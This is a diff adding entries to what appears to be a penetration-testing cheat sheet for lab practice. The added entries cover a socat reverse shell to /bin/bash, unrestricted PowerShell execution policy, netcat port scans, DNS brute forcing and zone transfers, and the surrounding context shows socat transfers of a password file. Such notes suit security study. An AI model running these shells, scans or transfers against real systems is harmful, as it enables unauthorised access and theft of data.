@@ -194,6 +194,10 @@ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 POWERSHELL
 ```bash
 
+# execution policy
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+
 # PS REVERSESHELL
 sudo nc -lnvp 443
 #reverseshell
@@ -260,6 +264,9 @@ socat - OPENSSL:10.11.0.4:443,verify=0
 # send file
 sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
 socat TCP4:10.10.0.1:443 file:received_secret_passwords.txt,create
+
+# reverse shell
+socat TCP4:10.10.0.22:443 EXEC:/bin/bash
 ```
 
 
@@ -284,6 +291,9 @@ nc -zv site.com 80 # scan port
 
 nc -zv hostname.com 80 84 # scan ports
 nc -zv site.com 80-84 # scan ports
+nc -nvv -w 1 -z 10.11.1.220 3388-3390
+nc -nv -u -z -w 1 10.11.1.115 160-162
+
 
 Netcat-Banner
 echo "" | nc -zv -wl [host] [port range] grab banner
@@ -304,9 +314,33 @@ echo "set mouse-=a" >> ~/.vimrc
 
 ```
 
+BASH SCRIPTING - LOOPS
+```bash
+# for-loop
+for ip in $(seq 1 10); do echo 10.11.1.$ip; done
+for url in $(cat list.txt); do host $url; done
+for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u
+
+# while-loop read from file
+while read line; do echo $line ; done < tmp.txt
+```
+
 SNMP (Port 161)
 ```
 snmp-check 192.168.120.94
+```
+
+DNS (Port 53)
+```
+host www.site.com
+host -t mx www.site.com
+host -t txt www.site.com
+
+# brute force
+for ip in $(cat list.txt); do host $ip.site.com; done
+
+# zone transfer
+host -l site.com ns1.site.com
 ```
 
 SMB (Port 138, 139, 445)
